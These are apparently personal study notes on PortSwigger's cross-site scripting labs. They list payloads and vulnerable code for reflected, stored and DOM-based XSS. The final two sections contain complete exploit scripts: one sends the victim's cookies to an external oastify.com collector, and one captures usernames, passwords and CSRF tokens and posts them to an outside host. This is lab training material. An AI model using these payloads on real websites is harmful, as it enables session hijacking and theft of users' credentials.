## [Reflected XSS into HTML context with nothing encoded](https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded)
Use payload into search bar

## [Stored XSS into HTML context with nothing encoded](https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded)
Use payload as a value into the POST payload

## [DOM XSS in `document.write` sink using source `location.search`](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink)
Read source to breakout of element and execute payload

## [DOM XSS in `innerHTML` sink using source `location.search`](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-innerhtml-sink)
Read source to breakout of element and execute payload (innerHTML will try to ban script and svg tag)

## [DOM XSS in jQuery anchor `href` attribute sink using `location.search` source](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-href-attribute-sink)
Read source and execute payload:
```
?returnUrl=javascript:alert(document.domain)
```

Exploitable code:
```
$(function() { $('#backLink').attr("href",(new URLSearchParams(window.location.search)).get('returnUrl')); });
```

## [DOM XSS in jQuery selector sink using a hashchange event](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-selector-hash-change-event)

![[Pasted image 20250406220258.png]]
jQuery's `$()` selector function, which can be used to inject malicious objects into the DOM.

```
<iframe src="https://vulnerable-website.com#" onload="this.src+='<img src=1 onerror=alert(1)>'">
```
## [Reflected DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-reflected)
Check Burp and one of the response is a JSON of the search string
![[Pasted image 20250406230039.png]]

Tampering the searchTerm with a payload that escapes the JSON
![[Pasted image 20250406230121.png]]

## [Reflected XSS into attribute with angle brackets HTML-encoded](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-attribute-angle-brackets-html-encoded)

Vulnerability + Payload:
`<input type=text placeholder='Search the blog...' name=search value="" onmouseover="alert(1)">`
![[Pasted image 20250406234435.png]]



```
javascript:alert(1)

```

## [Stored XSS into anchor `href` attribute with double quotes HTML-encoded](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-href-attribute-double-quotes-html-encoded)
Unsanitized url input
```html
                       <p>
                        <img src="/resources/images/avatarDefault.svg" class="avatar">                            <a id="author" href="http://www.dfsaf.com">lf</a> | 06 April 2025
                        </p>
```

## [Reflected XSS into a JavaScript string with angle brackets HTML encoded](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-html-encoded)
Vuln:
```html
                   <script>
                        var searchTerms = '' onerror='alert(1)';
                        document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
                    </script>
```

```
'-alert(1)-'
```

## [Stored DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-stored)
The vuln lies in this function, where it only obfuscates the FIRST < and FIRST >

```
function escapeHTML(html) {
        return html.replace('<', '&lt;').replace('>', '&gt;');
    }
```

## [Exploiting cross-site scripting to steal cookies](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies)

```javascript
<script>
fetch('https://8pyhekmpo423z0g2irg2twq17sdj1ep3.oastify.com', {
  method: 'POST',
  mode: 'no-cors',
  body: document.cookie
});
</script>
```

## [Exploiting cross-site scripting to capture passwords](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-capturing-passwords)

```javascript
<input type="text" name="username">
<input type="password" name="password" onchange="dothis()">

<script>
    function dothis() {
    var username = document.getElementsByName('username')[0].value
    var password = document.getElementsByName('password')[0].value
    var token = document.getElementsByName('csrf')[0].value
    var data = new FormData();

    data.append('csrf', token);
    data.append('postId', 1);
    data.append('comment', `${username}:${password}`);
    data.append('name', 'victim');
    data.append('email', 'blah@email.com');
    data.append('website', 'http://blah.com');

    fetch('https://eewn3qbvdar9o6587x58i2f7wy2pqlea.oastify.com', {
        method: 'POST',
        mode: 'no-cors',
        body: data
    });
    };
</script>
```